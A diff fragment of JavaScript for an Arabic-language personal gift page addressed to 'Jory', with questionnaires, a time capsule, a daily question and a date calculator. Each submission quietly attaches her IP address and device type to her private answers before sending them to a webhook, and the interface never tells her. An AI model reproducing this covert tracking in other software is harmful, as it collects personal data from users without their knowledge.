+                const sectionDiv = document.createElement('div');
+                sectionDiv.className = 'q-section open';
+
+                const header = document.createElement('div');
+                header.className = 'q-section-header';
+                header.onclick = () => sectionDiv.classList.toggle('open');
+                header.innerHTML = `<span>${sectionNames[sectionKey]} (${sectionQuestions.length})</span><span class="arrow">▼</span>`;
+                sectionDiv.appendChild(header);
+
+                const body = document.createElement('div');
+                body.className = 'q-section-body';
+
+                sectionQuestions.forEach(q => {
+                    const item = document.createElement('div');
+                    item.className = 'q-item';
+                    item.dataset.qIndex = q.index;
+                    if (allAnswers[q.index]) item.classList.add('answered');
+
+                    const label = document.createElement('label');
+                    label.innerText = `${q.index + 1}. ${q.text}`;
+
+                    const ta = document.createElement('textarea');
+                    ta.value = allAnswers[q.index] || '';
+                    ta.placeholder = 'اكتبي إجابتك...';
+                    ta.oninput = (e) => saveAnswer(q.index, e.target.value);
+
+                    item.appendChild(label);
+                    item.appendChild(ta);
+                    body.appendChild(item);
+                });
+
+                sectionDiv.appendChild(body);
+                container.appendChild(sectionDiv);
+            });
+
+            if (!container.children.length) {
+                container.innerHTML = '<p style="text-align:center; color:var(--text-secondary);">ما فيه أسئلة مطابقة</p>';
+            }
+        }
+
+        function filterBySection(section, btn) {
+            currentFilter = section;
+            document.querySelectorAll('#filterBar .filter-btn').forEach(b => b.classList.remove('active'));
+            if (btn) btn.classList.add('active');
+            renderQuestions();
+        }
+
+        function filterQuestions() {
+            currentSearch = document.getElementById('questionSearch').value.trim();
+            renderQuestions();
+        }
+
+        async function sendAllAnswers(event) {
+            const answeredIndices = Object.keys(allAnswers).filter(k => allAnswers[k] && allAnswers[k].trim());
+            if (!answeredIndices.length) {
+                showToast('ما جاوبتي على أي سؤال', 'error');
+                return;
+            }
+
+            const button = event ? event.target : null;
+            const originalText = button ? button.innerText : '';
+            if (button) { button.disabled = true; button.innerText = 'جاري الإرسال...'; }
+
+            const ipInfo = await getIPInfo();
+            const header = `**إجابات جوري**\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'} | **الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n\n`;
+
+            let chunks = [];
+            let currentChunk = header;
+            let answeredCount = 0;
+
+            for (const idx of answeredIndices.sort((a, b) => Number(a) - Number(b))) {
+                const q = questionsData[idx];
+                const answer = allAnswers[idx].trim();
+                const line = `**${Number(idx) + 1}. ${q.text}**\n${answer}\n\n`;
+
+                if ((currentChunk + line).length > 1900) {
+                    chunks.push(currentChunk);
+                    currentChunk = `**إجابات جوري (تكملة):**\n\n` + line;
+                } else {
+                    currentChunk += line;
+                }
+                answeredCount++;
+            }
+            if (currentChunk.trim()) chunks.push(currentChunk);
+
+            let success = 0;
+            for (let i = 0; i < chunks.length; i++) {
+                if (button) button.innerText = `جاري الإرسال ${i + 1}/${chunks.length}...`;
+                const ok = await sendWebhook(chunks[i]);
+                if (ok) success++;
+                if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 1200));
+            }
+
+            if (button) { button.disabled = false; button.innerText = originalText; }
+
+            if (success === chunks.length) {
+                showToast(`تم إرسال ${answeredCount} إجابة`, "success");
+                incrementFeelingsBadge();
+            } else {
+                showToast(`تم إرسال ${success} من ${chunks.length}`, "error");
+            }
+        }
+
+        function clearAllAnswers() {
+            if (!confirm('هل تريدين مسح كل الإجابات؟')) return;
+            allAnswers = {};
+            try { localStorage.removeItem(STORAGE_KEY); } catch(e) {}
+            updateProgress();
+            renderQuestions();
+            showToast('تم المسح', 'info');
+        }
+
+        loadAllAnswers();
+        renderQuestions();
+        updateProgress();
+
+        function toggleMemory(el, event) {
+            const checkbox = el.querySelector('.memory-check');
+            if (!(event && event.target === checkbox)) {
+                checkbox.checked = !checkbox.checked;
+            }
+            el.classList.toggle('done', checkbox.checked);
+            saveMemoryState();
+            updateMemoryProgress();
+        }
+
+        function saveMemoryState() {
+            const state = {};
+            document.querySelectorAll('.memory-check').forEach(cb => { state[cb.dataset.mem] = cb.checked; });
+            try { localStorage.setItem('gory_memory_state', JSON.stringify(state)); } catch(e) {}
+        }
+
+        function restoreMemoryState() {
+            try {
+                const state = JSON.parse(localStorage.getItem('gory_memory_state') || '{}');
+                document.querySelectorAll('.memory-check').forEach(cb => {
+                    if (state[cb.dataset.mem]) {
+                        cb.checked = true;
+                        cb.closest('.memory-item').classList.add('done');
+                    }
+                });
+            } catch(e) {}
+        }
+
+        function updateMemoryProgress() {
+            const checks = document.querySelectorAll('.memory-check');
+            const checked = document.querySelectorAll('.memory-check:checked');
+            document.getElementById('memoryProgressText').innerText = `${checked.length} من ${checks.length} ذكريات محققة`;
+        }
+        restoreMemoryState();
+        updateMemoryProgress();
+
+        async function saveCapsule() {
+            const msg = document.getElementById('capsuleMessage').value.trim();
+            if (!msg) { showToast("اكتبي رسالة أولا", "error"); return; }
+            const ipInfo = await getIPInfo();
+            const content = `**كبسولة وقت من جوري:**\n${msg}\n\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`;
+            const ok = await sendWebhook(content);
+            if (ok) {
+                document.getElementById('capsuleSaved').style.display = "block";
+                document.getElementById('capsuleMessage').value = "";
+                document.getElementById('capsuleCount').innerText = "0 حرف";
+                showToast("تم الحفظ", "success");
+            } else showToast("تعذر", "error");
+        }
+
+        const dailyQuestions = [
+            "لو تقدرين تسافرين بكرة، وين",
+            "وش الشيء اللي يضحكك دايما",
+            "لو تعيدين يوم، أي يوم",
+            "وش أحلى كلمة سمعتيها مني",
+            "لو تخبين شي عن الناس، وش",
+            "وش الشيء اللي تحسين إني ما أعرفه",
+            "آخر مرة حسيتي بفخر بنفسك",
+            "لو تكتبين كتاب، وش عنوانه",
+            "وش أكثر شي يريحك",
+            "تذكرة سفر لأي مكان، وين"
+        ];
+        function generateDailyQuestion() {
+            document.getElementById('dailyQuestionText').innerText = dailyQuestions[Math.floor(Math.random() * dailyQuestions.length)];
+        }
+        async function sendDailyAnswer() {
+            const q = document.getElementById('dailyQuestionText').innerText;
+            const a = document.getElementById('dailyAnswer').value.trim();
+            if (!a) { showToast("اكتبي إجابتك", "error"); return; }
+            if (q.includes("اضغطي")) { showToast("اضغطي جيب سؤال", "error"); return; }
+            const ipInfo = await getIPInfo();
+            const content = `**سؤال اليوم:** ${q}\n**إجابة جوري:** ${a}\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`;
+            const ok = await sendWebhook(content);
+            if (ok) {
+                showToast("تم الإرسال", "success");
+                document.getElementById('dailyAnswer').value = "";
+                incrementFeelingsBadge();
+            } else showToast("تعذر", "error");
+        }
+
+        function calculateDates() {
+            const from = document.getElementById('calcFrom').value;
+            const to = document.getElementById('calcTo').value;
+            const res = document.getElementById('calcResult');
+            if (!from || !to) { showToast("اختاري تاريخين", "error"); return; }
+            const diff = Math.abs(new Date(to) - new Date(from));
+            const days = Math.floor(diff / 86400000);
+            const years = Math.floor(days / 365);
+            const months = Math.floor((days % 365) / 30);
+            const remainingDays = days % 30;
+            res.style.display = "block";
+            res.innerHTML = `بين التاريخين:<br>${days} يوم<br>≈ ${years} سنة و ${months} شهر و ${remainingDays} يوم`;
+        }
+
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        let animFrame;
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            particles.forEach(p => { p.x = Math.random() * canvas.width; p.y = Math.random() * canvas.height; });
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2 + 1;
+                this.speedY = Math.random() * 0.5 + 0.2;
+                this.opacity = Math.random() * 0.5 + 0.2;
+            }
+            update() {
+                this.y -= this.speedY;
+                if (this.y < 0) { this.y = canvas.height; this.x = Math.random() * canvas.width; }
+            }
+            draw() {
+                ctx.fillStyle = `rgba(244, 114, 182, ${this.opacity})`;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        const isMobile = window.matchMedia('(max-width: 600px)').matches;
+        const count = isMobile ? 25 : 50;
+        for (let i = 0; i < count; i++) particles.push(new Particle());
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            animFrame = requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) cancelAnimationFrame(animFrame);
+            else animateParticles();
+        });
     </script>
 </body>
 </html>
